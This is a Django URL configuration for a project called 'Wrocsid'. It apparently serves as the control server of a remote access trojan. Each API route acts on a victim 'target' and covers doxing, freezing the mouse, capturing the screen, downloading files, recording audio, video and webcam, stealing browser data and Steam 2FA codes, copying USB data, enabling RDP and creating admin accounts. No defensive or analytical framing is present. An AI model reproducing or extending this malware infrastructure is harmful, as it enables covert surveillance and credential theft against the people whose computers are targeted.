"""Wrocsid URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/4.0/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import path, re_path
from Wrocsid import views

urlpatterns = [
    path('admin/', admin.site.urls),

    re_path(r'^api/targets/$', views.targets),
    re_path(r'^api/target/(?P<target_uuid>\d+)/$', views.target),
    re_path(r'^api/ping/(?P<target_uuid>\d+)/$', views.ping),
    re_path(r'^api/targetmessagebyuuid/(?P<target_uuid>\d+)/$', views.get_target_message_id_by_uuid),
    re_path(r'^api/ping/(?P<target_uuid>\d+)/$', views.ping),
    re_path(r'^api/results/(?P<target_uuid>\d+)/$', views.get_target_results),
    re_path(r'^api/pings/(?P<target_uuid>\d+)/$', views.get_target_pings),
    
    re_path(r'^api/dox/(?P<target_uuid>\d+)/$', views.dox),
    re_path(r'^api/mouse/(?P<target_uuid>\d+)/(?P<freeze_time>\d+[smh])/$', views.mouse),
    re_path(r'^api/screen/(?P<target_uuid>\d+)/$', views.screen),
    re_path(r'^api/download/(?P<target_uuid>\d+)/(?P<path>.+)/$', views.download),
    re_path(r'^api/record/(?P<target_uuid>\d+)/(?P<record_time>\d+[smh])/$', views.record),
    re_path(r'^api/disconnect/(?P<target_uuid>\d+)/$', views.disconnect),
    re_path(r'^api/safe_disconnect/(?P<target_uuid>\d+)/$', views.safe_disconnect),
    re_path(r'^api/getSteam2fa/(?P<target_uuid>\d+)/$', views.getSteam2fa),
    re_path(r'^api/rdp_enable/(?P<target_uuid>\d+)/$', views.rdp_enable),
    re_path(r'^api/create_admin_user/(?P<target_uuid>\d+)/$', views.create_admin_user),
    re_path(r'^api/videorecord/(?P<target_uuid>\d+)/(?P<record_time>\d+[smh])/$', views.video_record),
    re_path(r'^api/camerarecord/(?P<target_uuid>\d+)/(?P<record_time>\d+[smh])/$', views.camera_record),
    re_path(r'^api/browserdata/(?P<target_uuid>\d+)/$', views.get_browser_data),
    re_path(r'^api/usbdata/(?P<target_uuid>\d+)/$', views.copy_usb_data),
    re_path(r'^api/rdpenable/(?P<target_uuid>\d+)/$', views.rdp_enable),
    re_path(r'^api/createadminuser/(?P<target_uuid>\d+)/$', views.create_admin_user),
]